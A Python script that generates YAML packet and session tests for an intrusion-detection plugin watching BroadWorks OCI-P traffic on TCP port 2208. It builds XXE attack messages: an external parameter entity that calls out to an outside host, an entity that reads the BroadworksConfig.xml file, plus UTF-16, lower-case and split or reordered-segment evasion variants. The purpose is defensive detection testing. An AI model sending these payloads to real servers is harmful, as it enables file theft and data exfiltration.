#!/usr/bin/env python3
"""Writes the ocip project's packet and session tests (tests/corpus/README.md, schema 1).

Expected values come from the OCI-P messages built here (the wire format of
lukebeer/broadworks-ocip, the same messages as gen_pcaps.py), never from what the
plugin outputs: has_dtd is 1 exactly when the bytes hold "<!DOCTYPE" (ASCII, any
case, or UTF-16), dtd is the declaration's first 63 characters, session_id the
<sessionId> text, command_type the <command>'s xsi:type, is_request 1 for the
client (to port 2208).
Usage: python3 make_tests.py <project>/tests
"""

import os
import sys

OUT = sys.argv[1]
os.makedirs(OUT, exist_ok=True)

HEAD = b'<?xml version="1.0" encoding="UTF-8"?>'
DOC_OPEN = b'<BroadsoftDocument protocol="OCI" xmlns="C" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
SRC = (
    "OCI-P wire format: lukebeer/broadworks-ocip Builder.php "
    "(XML_HEAD + BroadsoftDocument, sessionId, command xsi:type) and "
    "TCPTransport.php (one document per message, newline-terminated, TCP 2208)"
)


def oci(command, session=b"a1b2c3d4e5f6", doctype=b""):
    return (
        HEAD
        + doctype
        + DOC_OPEN
        + b'<sessionId xmlns="">'
        + session
        + b"</sessionId>"
        + command
        + b"</BroadsoftDocument>\n"
    )


def cmd(t, body=b"<userId>admin</userId>"):
    return b'<command xsi:type="' + t + b'" xmlns="">' + body + b"</command>"


AUTH = cmd(b"AuthenticationRequest")
ERR = oci(
    b'<command xsi:type="c:ErrorResponse" xmlns:c="C" xmlns="">'
    b'<summary>[Error 4962] Invalid password</summary></command>'
)
D_OOB = (
    b'<!DOCTYPE BroadsoftDocument [<!ENTITY % ext SYSTEM "http://203.0.113.'
    b'50:8000/oci.dtd"> %ext; %send;]>'
)
D_FILE = (
    b'<!DOCTYPE BroadsoftDocument [<!ENTITY xxe SYSTEM "file:///usr/local/'
    b'broadworks/bw_base/conf/BroadworksConfig.xml">]>'
)
D_EXT = b'<!DOCTYPE BroadsoftDocument SYSTEM "http://203.0.113.50/oci.dtd">'


def hexlines(b):
    return [" ".join(f"{x:02x}" for x in b[i : i + 16]) for i in range(0, len(b), 16)]


def q(s):
    return '"' + s.replace("\\", "\\\\").replace('"', '\\"') + '"'


def text_of(b):
    return b.decode("latin-1").replace("\r", "\\r").replace("\n", "\\n").replace("\t", "\\t")


def ylist(lines, indent):
    space = " " * indent
    return "".join(f"{space}- {q(line)}\n" for line in lines)


def attr_block(attrs, indent, with_pos=True):
    """attrs: list of (name, type, value, offset, length, source) or
    (name, type, 'absent', source)."""
    pad = " " * indent
    out = ""
    for a in attrs:
        name, typ = a[0], a[1]
        out += f"{pad}- name: {q(name)}\n"
        if typ:
            out += f"{pad}  type: {q(typ)}\n"
        if a[2] == "absent":
            out += f'{pad}  status: "absent"\n'
            if len(a) > 3:
                out += f"{pad}  source: {q(a[3])}\n"
            continue
        value, off, ln, src = a[2], a[3], a[4], a[5]
        if with_pos:
            out += f"{pad}  offset: {off}\n{pad}  length: {ln}\n"
        if isinstance(value, bytes):
            hex_str = " ".join(f"{x:02x}" for x in value)
            out += f"{pad}  value: {q(hex_str)}\n"
            out += f"{pad}  text: {q(text_of(value))}\n"
        else:
            out += f"{pad}  value: {value}\n"
        if src:
            out += f"{pad}  source: {q(src)}\n"
    return out


def strval(msg, needle, name, src, typ="MMT_STRING_DATA", limit=63):
    """A string attribute whose value is the bytes `needle` found in msg."""
    off = msg.index(needle)
    return (name, typ, needle[:limit], off, min(len(needle), limit), src)


def write_packet(stem, summary, msg, attrs, bytes_source, note=None):
    y = (
        "# Packet test of the ocip plugin (mmt-security rule 231), written from the "
        "OCI-P wire format,\n"
        "# not from the plugin's output. Format and rules: tests/corpus/README.md\n"
        "schema: 1\n"
        f'id: {q("ocip/" + stem)}\nmodel: "ocip"\nsummary: {q(summary)}\n'
        'through: "tcp:dport=2208"\n'
        'parent:\n  kind: "stack"\n  path:\n    - "ethernet"\n    - "ip"\n    - "tcp"\n'
        f'  selector: "TCP port 2208 (OCI-P, cleartext)"\n  source: {q(SRC)}\n'
        f"bytes:\n{ylist(hexlines(msg), 2)}"
        f"bytes_source: {q(bytes_source)}\n"
        'expect:\n  protocol: "OCIP"\n  proto_id: 960\n  next:\n    kind: "none"\n'
        '    source: "model-declared: encapsulation is false, so no next protocol"\n'
        f"  attributes:\n{attr_block(attrs, 4)}"
    )
    if note:
        y += f"note: {q(note)}\n"
    with open(os.path.join(OUT, stem + ".yaml"), "w") as f:
        f.write(y)


def has_dtd(msg, v, src):
    return ("has_dtd", "MMT_U8_DATA", v, 0, len(msg), src)


ABS = lambda n, t, s: (n, t, "absent", s)  # noqa: E731

# --- packet tests ---
m = oci(AUTH)
write_packet(
    "auth-request",
    "A client's AuthenticationRequest, no DTD",
    m,
    [
        has_dtd(m, 0, "no <!DOCTYPE in the message"),
        strval(m, b"a1b2c3d4e5f6", "session_id", "the <sessionId> text"),
        strval(m, b"AuthenticationRequest", "command_type", "the <command>'s xsi:type"),
        ABS("dtd", "MMT_STRING_DATA", "no DOCTYPE declaration"),
    ],
    "gen_pcaps.py oci(AUTH): the first message of benign_ocip.pcap",
)

m = oci(AUTH, doctype=D_OOB)
write_packet(
    "xxe-oob-parameter-entity",
    "XXE V2: a DTD whose external parameter entity calls out (CVE-2026-20320)",
    m,
    [
        ("has_dtd", "MMT_U8_DATA", 1, m.index(b"<!DOCTYPE"), 9, "a <!DOCTYPE in the message"),
        strval(m, D_OOB, "dtd", "the declaration, its first 63 bytes"),
        strval(m, b"a1b2c3d4e5f6", "session_id", "the <sessionId> text"),
        strval(m, b"AuthenticationRequest", "command_type", "the <command>'s xsi:type"),
    ],
    "gen_pcaps.py attack_v2_oob_param (the registered check pcap's message, frame 4)",
)

m = oci(AUTH, session=b"&xxe;", doctype=D_FILE)
write_packet(
    "xxe-file-entity",
    "XXE V1: an external general entity echoed in sessionId, as sent (not resolved)",
    m,
    [
        ("has_dtd", "MMT_U8_DATA", 1, m.index(b"<!DOCTYPE"), 9, "a <!DOCTYPE in the message"),
        strval(m, D_FILE, "dtd", "the declaration, its first 63 bytes"),
        strval(
            m,
            b"&xxe;",
            "session_id",
            "the <sessionId> text as sent: the entity reference is never resolved",
        ),
        strval(m, b"AuthenticationRequest", "command_type", "the <command>'s xsi:type"),
    ],
    "gen_pcaps.py attack_v1_file_entity",
)

D_WS = b'\n<!DOCTYPE\tBroadsoftDocument\n  PUBLIC "-//x//y" \n "ftp://203.0.113.50/oci.dtd" >\n'
m = oci(AUTH, doctype=D_WS)
write_packet(
    "xxe-public-whitespace",
    "XXE V4: PUBLIC identifier with tabs and newlines in the DOCTYPE",
    m,
    [
        ("has_dtd", "MMT_U8_DATA", 1, m.index(b"<!DOCTYPE"), 9, "a <!DOCTYPE in the message"),
        strval(m, D_WS.strip(b"\n"), "dtd", "the declaration, its first 63 bytes"),
        strval(m, b"AuthenticationRequest", "command_type", "the <command>'s xsi:type"),
        strval(m, b"a1b2c3d4e5f6", "session_id", "the <sessionId> text"),
    ],
    "gen_pcaps.py attack_v4_public_ws",
)

D_LOW = b'<!doctype BroadsoftDocument SYSTEM "http://203.0.113.50/oci.dtd">'
m = oci(AUTH, doctype=D_LOW)
write_packet(
    "xxe-lowercase-doctype",
    "A lower-case <!doctype: XML keywords are case-sensitive, but the plugin counts any case",
    m,
    [
        (
            "has_dtd",
            "MMT_U8_DATA",
            1,
            m.index(b"<!doctype"),
            9,
            "a <!DOCTYPE in any case (the plugin's documented rule)",
        ),
        (
            "dtd",
            "MMT_STRING_DATA",
            (b"<!DOCTYPE" + D_LOW[9:])[:63],
            m.index(D_LOW),
            63,
            "the declaration, its first 63 bytes, the keyword written <!DOCTYPE",
        ),
        strval(m, b"AuthenticationRequest", "command_type", "the <command>'s xsi:type"),
        strval(m, b"a1b2c3d4e5f6", "session_id", "the <sessionId> text"),
    ],
    "a variant of gen_pcaps.py attack_v3_ext_dtd with the keyword in lower case",
)

m = ERR
write_packet(
    "error-response",
    "A server's c:ErrorResponse: the xsi:type as sent, with its prefix",
    m,
    [
        has_dtd(m, 0, "no <!DOCTYPE in the message"),
        strval(m, b"c:ErrorResponse", "command_type", "the <command>'s xsi:type, prefix included"),
        strval(m, b"a1b2c3d4e5f6", "session_id", "the <sessionId> text"),
        ABS("dtd", "MMT_STRING_DATA", "no DOCTYPE declaration"),
    ],
    "gen_pcaps.py ERR, the server's reply in every attack pcap",
)


def u16(s, enc):
    return s.encode(enc)


U16_DOC = (
    '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE BroadsoftDocument SYSTEM "http://203.0.113.50/oci.dtd">'
    '<BroadsoftDocument protocol="OCI" xmlns="C"><sessionId xmlns="">s1</sessionId>'
    '<command xsi:type="AuthenticationRequest" xmlns="" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    "<userId>admin</userId></command></BroadsoftDocument>\n"
)
D_U16 = b'<!DOCTYPE BroadsoftDocument SYSTEM "http://203.0.113.50/oci.dtd">'


def u16attrs(m, enc, bom):
    w = 2
    base = 2 if bom else 0
    s = U16_DOC
    return [
        (
            "has_dtd",
            "MMT_U8_DATA",
            1,
            base + w * s.index("<!DOCTYPE"),
            18,
            "a UTF-16 <!DOCTYPE in the message",
        ),
        (
            "dtd",
            "MMT_STRING_DATA",
            D_U16[:63],
            base + w * s.index("<!DOCTYPE"),
            2 * len(D_U16),
            "the declaration decoded to ASCII, its first 63 bytes",
        ),
        (
            "session_id",
            "MMT_STRING_DATA",
            b"s1",
            base + w * s.index(">s1<") + 2,
            4,
            "the <sessionId> text, decoded",
        ),
        (
            "command_type",
            "MMT_STRING_DATA",
            b"AuthenticationRequest",
            base + w * s.index("AuthenticationRequest"),
            42,
            "the <command>'s xsi:type, decoded",
        ),
    ]


m = U16_DOC.encode("utf-16")  # FF FE, then UTF-16LE
write_packet(
    "xxe-utf16le-bom",
    "XXE V6: the whole document in UTF-16LE after a byte order mark",
    m,
    u16attrs(m, "le", True),
    "gen_pcaps.py attack_v6_utf16 (Python's utf-16 codec: FF FE then little-endian)",
)
m = U16_DOC.encode("utf-16-be")
write_packet(
    "xxe-utf16be-nobom",
    "The same document in UTF-16BE without a byte order mark",
    m,
    u16attrs(m, "be", False),
    "attack_v6_utf16's document encoded utf-16-be, no mark",
)

m = b"GET / HTTP/1.1\r\nHost: xsp.example.net\r\n\r\n"
write_packet(
    "not-xml",
    "Text that is not XML on port 2208: has_dtd 0, nothing else",
    m,
    [
        has_dtd(m, 0, "no <!DOCTYPE"),
        ABS("dtd", "MMT_STRING_DATA", "no declaration"),
        ABS("session_id", "MMT_STRING_DATA", "no <sessionId>"),
        ABS("command_type", "MMT_STRING_DATA", "no <command>"),
    ],
    "an HTTP request line sent to the OCI-P port",
)

m = (
    HEAD
    + b"<!-- <!DOCTYPE is only named in this comment? no: the bytes are there --><!ENTITY-like>"
    + DOC_OPEN
    + b'<sessionId xmlns="">a1</sessionId>'
    + AUTH
    + b"</BroadsoftDocument>\n"
)
write_packet(
    "comment-mentions-doctype",
    "A comment that holds the bytes <!DOCTYPE: has_dtd counts the bytes, no declaration is parsed",
    m,
    [
        (
            "has_dtd",
            "MMT_U8_DATA",
            1,
            m.index(b"<!DOCTYPE"),
            9,
            "the bytes <!DOCTYPE are in the segment (byte search, by design)",
        ),
        ABS("dtd", "MMT_STRING_DATA", "inside a comment: no declaration"),
        strval(m, b"a1", "session_id", "the <sessionId> text, after the comment"),
        strval(m, b"AuthenticationRequest", "command_type", "the <command>'s xsi:type"),
    ],
    "crafted: a message whose comment holds the keyword",
)

# --- session tests ---
SESSION_ATTRS = [
    ("has_dtd", "MMT_U8_DATA"),
    ("dtd", "MMT_STRING_DATA"),
    ("command_type", "MMT_STRING_DATA"),
    ("session_id", "MMT_STRING_DATA"),
    ("is_request", "MMT_U8_DATA"),
]


def sv(name, value):
    if isinstance(value, bytes):
        hex_str = " ".join(f"{x:02x}" for x in value)
        return f"        - name: {q(name)}\n          value: {q(hex_str)}\n          text: {q(text_of(value))}\n"
    return f"        - name: {q(name)}\n          value: {value}\n"


def step(frm, data, expect=None, retransmit=False, lost=0, text=None, back=0):
    s = f"  - from: {q(frm)}\n"
    if retransmit:
        s += "    retransmit: true\n"
    if lost:
        s += f"    lost: {lost}\n"
    if back:
        s += f"    back: {back}\n"
    if text:
        s += f"    text: {q(text)}\n"
    if data:
        s += "    bytes:\n" + ylist(hexlines(data), 6)
    if expect == "none":
        s += '    expect: "none"\n'
    elif expect is not None:
        s += "    expect:\n      attributes:\n" + "".join(sv(k, v) for k, v in expect)
    return s


def write_session(stem, summary, steps, source):
    y = (
        "# Session test of the ocip plugin (mmt-security rule 231), written from the "
        "OCI-P wire format:\n"
        "# its packets run in order, one TCP connection. Format and rules: "
        "tests/corpus/README.md, Session files\n"
        f'schema: 1\nid: {q("ocip/" + stem)}\nmodel: "ocip"\nsummary: {q(summary)}\n'
        f'source: {q(source)}\n'
        "session:\n  through: \"tcp:dport=2208,sport=42003\"\n"
        '  protocol: "OCIP"\n  proto_id: 960\n  attributes:\n'
    )
    for n, t in SESSION_ATTRS:
        y += f"    - name: {q(n)}\n      type: {q(t)}\n"
    y += "packets:\n  - open: true\n" + "".join(steps)
    with open(os.path.join(OUT, stem + ".yaml"), "w") as f:
        f.write(y)


SRV_ERR = [
    ("has_dtd", 0),
    ("session_id", b"a1b2c3d4e5f6"),
    ("command_type", b"c:ErrorResponse"),
    ("is_request", 0),
]

v7 = oci(AUTH, doctype=D_EXT)
cut = v7.index(b"<!DOC") + 5
write_session(
    "session-split-doctype",
    "XXE V7: <!DOC and TYPE in two client segments; found in the second, once",
    [
        step("client", v7[:cut], [("has_dtd", 0), ("is_request", 1)], text="...<!DOC"),
        step(
            "client",
            v7[cut:],
            [
                ("has_dtd", 1),
                ("dtd", D_EXT[:63]),
                ("session_id", b"a1b2c3d4e5f6"),
                ("command_type", b"AuthenticationRequest"),
                ("is_request", 1),
            ],
            text="TYPE ...",
        ),
        step("server", ERR, SRV_ERR),
    ],
    "gen_pcaps.py attack_v7_split: the same cut, after '<!DOC'",
)

LOGIN = cmd(
    b"LoginRequest22V5",
    b"<userId>admin</userId><password>5f4dcc3b5aa765d61d8327deb882cf99</password>",
)
UG = cmd(b"UserGetRequest22", b"<userId>alice@voice.example.net</userId>")
AUTH_RESP = oci(
    cmd(
        b"AuthenticationResponse",
        b"<userId>admin</userId><nonce>1763390000123</nonce><passwordAlgorithm>MD5</passwordAlgorithm>",
    )
)
LOGIN_RESP = oci(cmd(b"LoginResponse22V5", b"<loginType>System</loginType><locale>en_US</locale>"))
UG_RESP = oci(
    cmd(
        b"UserGetResponse22",
        b"<serviceProviderId>SP1</serviceProviderId><groupId>G1</groupId><lastName>Doe</lastName>",
    )
)


def ok(t, req):
    return [
        ("has_dtd", 0),
        ("session_id", b"a1b2c3d4e5f6"),
        ("command_type", t),
        ("is_request", req),
    ]


write_session(
    "session-benign",
    "A normal OCI-P session: authenticate, log in, get a user, with the replies; no DTD anywhere",
    [
        step("client", oci(AUTH), ok(b"AuthenticationRequest", 1)),
        step("server", AUTH_RESP, ok(b"AuthenticationResponse", 0)),
        step("client", oci(LOGIN), ok(b"LoginRequest22V5", 1)),
        step("server", LOGIN_RESP, ok(b"LoginResponse22V5", 0)),
        step("client", oci(UG), ok(b"UserGetRequest22", 1)),
        step("server", UG_RESP, ok(b"UserGetResponse22", 0)),
    ],
    "gen_pcaps.py benign_ocip.pcap's messages",
)

u16_doc = U16_DOC.encode("utf-16")
u16_cut = 2 + 2 * U16_DOC.index("<!DOCTYPE") + 9  # odd: inside the code unit of 'O'
write_session(
    "session-utf16-split",
    "UTF-16LE XXE whose <!DOCTYPE is cut in the middle of a code unit",
    [
        step("client", u16_doc[:u16_cut], [("has_dtd", 0), ("is_request", 1)]),
        step(
            "client",
            u16_doc[u16_cut:],
            [
                ("has_dtd", 1),
                ("dtd", D_U16[:63]),
                ("session_id", b"s1"),
                ("command_type", b"AuthenticationRequest"),
                ("is_request", 1),
            ],
        ),
        step("server", ERR, SRV_ERR),
    ],
    "attack_v6_utf16's document, cut at an odd byte inside the keyword",
)

v2 = oci(AUTH, doctype=D_OOB)
write_session(
    "session-second-message",
    "A benign message, then an XXE in the same connection: the DTD of the second one counts",
    [
        step("client", oci(AUTH), ok(b"AuthenticationRequest", 1)),
        step("server", ERR, SRV_ERR),
        step(
            "client",
            v2,
            [
                ("has_dtd", 1),
                ("dtd", D_OOB[:63]),
                ("session_id", b"a1b2c3d4e5f6"),
                ("command_type", b"AuthenticationRequest"),
                ("is_request", 1),
            ],
        ),
        step(
            "client",
            v2,
            [("has_dtd", 1), ("is_request", 1)],
            retransmit=True,
            text="no new bytes: only has_dtd (the segment searched alone) and is_request",
        ),
    ],
    "gen_pcaps.py messages, two in one connection",
)

write_session(
    "session-two-in-one-segment",
    "A benign message and an XXE in one segment: has_dtd 1, the first message's values",
    [
        step(
            "client",
            oci(UG) + v2,
            [
                ("has_dtd", 1),
                ("dtd", D_OOB[:63]),
                ("session_id", b"a1b2c3d4e5f6"),
                ("command_type", b"UserGetRequest22"),
                ("is_request", 1),
            ],
        ),
    ],
    "gen_pcaps.py messages, pipelined",
)

write_session(
    "session-after-gap",
    "Bytes lost before an XXE message: the scan starts again and finds it",
    [
        step("client", oci(AUTH)[:40], [("has_dtd", 0), ("is_request", 1)]),
        step(
            "client",
            v2,
            [
                ("has_dtd", 1),
                ("dtd", D_OOB[:63]),
                ("session_id", b"a1b2c3d4e5f6"),
                ("command_type", b"AuthenticationRequest"),
                ("is_request", 1),
            ],
            lost=100,
        ),
    ],
    "gen_pcaps.py messages, with lost bytes",
)

long_steps = []
for _ in range(25):
    long_steps.append(step("client", oci(UG), ok(b"UserGetRequest22", 1)))
    long_steps.append(step("server", UG_RESP, ok(b"UserGetResponse22", 0)))
long_steps.append(step("client", v7[:cut], [("has_dtd", 0), ("is_request", 1)], text="...<!DOC"))
long_steps.append("  - idle: 70\n")
long_steps.append(
    step(
        "client",
        v7[cut:],
        [
            ("has_dtd", 1),
            ("dtd", D_EXT[:63]),
            ("session_id", b"a1b2c3d4e5f6"),
            ("command_type", b"AuthenticationRequest"),
            ("is_request", 1),
        ],
        text="TYPE ...",
    )
)
long_steps.append(step("server", ERR, SRV_ERR))
write_session(
    "session-long-split-doctype",
    "50 benign packets (past mmt-dpi's 40 classification packets), then V7's "
    "split DOCTYPE with 70 s idle between its halves",
    long_steps,
    "gen_pcaps.py benign UserGet exchange x25, then attack_v7_split's two "
    "client segments",
)

srv_dtd = HEAD + b'<!DOCTYPE BroadsoftDocument SYSTEM "oci.dtd">' + AUTH_RESP[len(HEAD) :]
write_session(
    "session-server-doctype",
    "A server reply with a DOCTYPE: has_dtd 1, is_request 0 (rule 231 ignores it)",
    [
        step("client", oci(AUTH), ok(b"AuthenticationRequest", 1)),
        step(
            "server",
            srv_dtd,
            [
                ("has_dtd", 1),
                ("dtd", b'<!DOCTYPE BroadsoftDocument SYSTEM "oci.dtd">'),
                ("session_id", b"a1b2c3d4e5f6"),
                ("command_type", b"AuthenticationResponse"),
                ("is_request", 0),
            ],
        ),
    ],
    "gen_pcaps.py benign_html_doctype.pcap, second flow",
)
# Reordered segments (#137): the second half of a split "<!DOCTYPE" arrives
# first. A segment with no new bytes reports only has_dtd and is_request; it
# completes the keyword when it fills the hole the first half left.
LATE = [("has_dtd", 1), ("is_request", 1)]
after_v7 = [  # the second half alone, after a hole: a new message
    ("has_dtd", 0),
    ("session_id", b"a1b2c3d4e5f6"),
    ("command_type", b"AuthenticationRequest"),
    ("is_request", 1),
]
write_session(
    "session-reordered-split-doctype",
    "XXE V7 reordered: TYPE ... first, then the late ...<!DOC, which completes the keyword",
    [
        step("client", v7[cut:], after_v7, lost=cut, text="TYPE ... (the first cut bytes not yet seen)"),
        step("client", v7[:cut], LATE, back=len(v7), text="...<!DOC, late"),
        step("server", ERR, SRV_ERR),
    ],
    "gen_pcaps.py attack_v7_split's two client segments, in reverse order",
)

FILL = b"<!-- " + b"x" * (cut - 9) + b" -->"  # an XML comment as long as the hole
assert len(FILL) == cut and b"<!DOC" not in FILL.upper()
write_session(
    "session-reordered-filler",
    "XXE V7 reordered, a filler over the hole first (one the server drops, a bad "
    "checksum, the probe keeps): the late ...<!DOC still completes the keyword",
    [
        step("client", oci(AUTH), ok(b"AuthenticationRequest", 1)),
        step("server", AUTH_RESP, ok(b"AuthenticationResponse", 0)),
        step("client", v7[cut:], after_v7, lost=cut, text="TYPE ..."),
        step("client", FILL, [("has_dtd", 0), ("is_request", 1)], back=len(v7), text="filler"),
        step("client", v7[:cut], LATE, back=len(v7), text="...<!DOC, late"),
        step("client", v7[:cut], LATE, back=len(v7), text="...<!DOC, retransmitted"),
        step("server", ERR, SRV_ERR),
    ],
    "gen_pcaps.py attack_v7_split's two client segments, reversed, after an "
    "AuthenticationRequest; the filler is crafted",
)

mid = v7.index(b"<!DOC") + 4  # "<!DO" | "CT" | "YPE ...": the late segment is 2 bytes
write_session(
    "session-reordered-short-middle",
    "XXE: <!DO, then YPE ..., then the late CT between them, shorter than the keyword",
    [
        step("client", oci(UG), ok(b"UserGetRequest22", 1)),
        step("client", v7[:mid], [("has_dtd", 0), ("is_request", 1)], text="...<!DO"),
        step(
            "client",
            v7[mid + 2 :],
            after_v7,
            lost=2,
            text="YPE ... (CT not yet seen)",
        ),
        step("client", v7[mid : mid + 2], LATE, back=len(v7) - mid, text="CT, late"),
    ],
    "gen_pcaps.py attack_v7_split, cut in three at '<!DO' and 'CT'",
)

whole = v7.index(b"<!DOC")  # the XML declaration, then everything from "<!DOCTYPE"
write_session(
    "session-reordered-whole-doctype",
    "A reordered message whose DOCTYPE is whole in the segment that arrives first: "
    "found there, not again in the late one",
    [
        step(
            "client",
            v7[whole:],
            [
                ("has_dtd", 1),
                ("dtd", D_EXT[:63]),
                ("session_id", b"a1b2c3d4e5f6"),
                ("command_type", b"AuthenticationRequest"),
                ("is_request", 1),
            ],
            lost=whole,
            text="<!DOCTYPE ... (the XML declaration not yet seen)",
        ),
        step("client", v7[:whole], [("has_dtd", 0), ("is_request", 1)], back=len(v7), text="<?xml ...?>, late"),
    ],
    "gen_pcaps.py attack_v7_split's message, cut after its XML declaration, reversed",
)

# A documented limit (REPORT.md, "Not checked"; the header of src/ocip_impl.c):
# a keyword split between two late segments is missed, even when each touches
# an edge of the hole, since a late segment is searched only with the hole's
# recorded edges, never with another late segment. This test pins the miss.
write_session(
    "session-reordered-two-late-halves",
    "Limit, pinned: V7 cut in three at '<!DOC' and 'TYPE', sent in reverse order; "
    "the keyword is split between the two late segments, so has_dtd is 0 on both",
    [
        step("client", v7[cut + 4 :], after_v7, lost=cut + 4, text="rest of the message (<!DOC and TYPE not yet seen)"),
        step("client", v7[cut : cut + 4], [("has_dtd", 0), ("is_request", 1)], back=len(v7) - cut, text="TYPE, late"),
        step("client", v7[:cut], [("has_dtd", 0), ("is_request", 1)], back=len(v7), text="...<!DOC, late"),
    ],
    "gen_pcaps.py attack_v7_split, cut in three at '<!DOC' and 'TYPE', in reverse order",
)
print("wrote", sorted(os.listdir(OUT)))
